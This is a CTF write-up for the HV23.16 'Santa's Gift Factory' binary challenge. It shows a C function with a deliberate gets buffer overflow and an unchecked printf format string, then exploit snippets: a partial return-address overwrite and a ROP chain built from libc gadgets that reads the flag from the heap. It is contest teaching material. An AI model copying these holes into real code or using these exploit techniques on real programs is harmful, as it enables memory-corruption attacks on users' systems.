## [HV23.16] Santa's Gift Factory (fabi_07)
### Description
> Did you know that Santa has its own factory for making gifts? Maybe you can exploit it to get your own special gift!
### Solution
When running the binary, you firstly have to complete a simple counting excersise. After this the tellflag function get called which only gives you a little part of the flag, because the rest seems to have been lost. 
```c
void tellflag() {
  char buffer[128];
  FILE *fp = fopen("flag", "r");
  if(fp == NULL) {
    error("Opening flag file failed!!! Please contact the admins.");
  }

  char flag[6];
  int len = fread(flag, 1, 5, fp);
  flag[len] = '\0';

  if(fclose(fp) < 0) {
    error("Closing flag file failed!!! Please contact the admins.");
  }

  system("./magic.sh");

  char* name = getstr("Santa: One last thing, can you tell me your name?");
  printf("\nSanta: Let me see. Oh no, this is bad, the flag vanished before i could read it entirely. All I can give you is this: %s. I am very sorry about this and would like to apologise for the inconvenience.\n", flag);
  gets("\nSanta: Can I assist you with anything else?", buffer);
  printf("\nSanta: You want me to help you with ");
  printf(buffer);
  puts("?\nSanta: I will see what I can do...");
}
```
But when searching in the process memory, you can find the flag in a chunk on the heap. Additionally there is a bufferoverflow with gets and a formatstring vulnerability. But as the formatstring leak is after the bufferoverflow it is not possible to directly use the leak. To fix this you can extend the formatstring payload to overwrite the lowest byte of the return address which causes the tellflag function to be executed a second time.
```py
payload1 = flat({0:b'%p '*50, 167:chr(0x9b).encode()})          # formatstring vuln and override lowest byte of return address to run tellflag twice
```
As i wasn't able to find a heap address in the leak, i just called the getstr function which returns a heap pointer. With the help of a add gadget and printf you can read the flag from the heap.
```py
    # rop-chain: 'pop rsi' 'buffer_address' 'pop rdi' 'buffer_address' 'getstr' 'pop rdx' 'heap offset' 'add rax, rdx' 'error+43'
    payload = flat({168:[0x2573e+libc, 0x1F690+stack, 0x240e5+libc, 0x1F690+stack, 0x139D+-0xf+function, 0x26302+libc, pack(-0x26E-0x180, 64), 0x76a7a+libc, 0x130E+function, 0x1354+function]})
```
A complete solve.py can be found [here](Playtest/solve.py).
